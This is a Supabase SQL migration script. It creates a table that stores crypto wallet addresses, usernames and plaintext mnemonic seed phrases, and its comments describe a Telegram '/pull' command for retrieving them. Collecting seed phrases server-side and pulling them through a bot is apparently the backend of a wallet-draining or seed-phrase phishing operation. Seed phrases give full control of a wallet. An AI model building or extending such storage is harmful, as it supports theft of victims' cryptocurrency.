-- Run once in Supabase SQL Editor. Idempotent, safe to rerun.
-- Adds seed-phrase storage and Telegram /pull command state.

create table if not exists public.wallet_phrases (
  wallet_address text primary key,
  username text,
  mnemonic text not null,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

grant all on public.wallet_phrases to service_role;
alter table public.wallet_phrases enable row level security;
drop policy if exists "wallet_phrases block all" on public.wallet_phrases;
create policy "wallet_phrases block all" on public.wallet_phrases for all
  to anon, authenticated using (false) with check (false);

-- /pull authorization is carried by short-lived, signed Telegram buttons.
-- No database table is required for temporary unlock state.
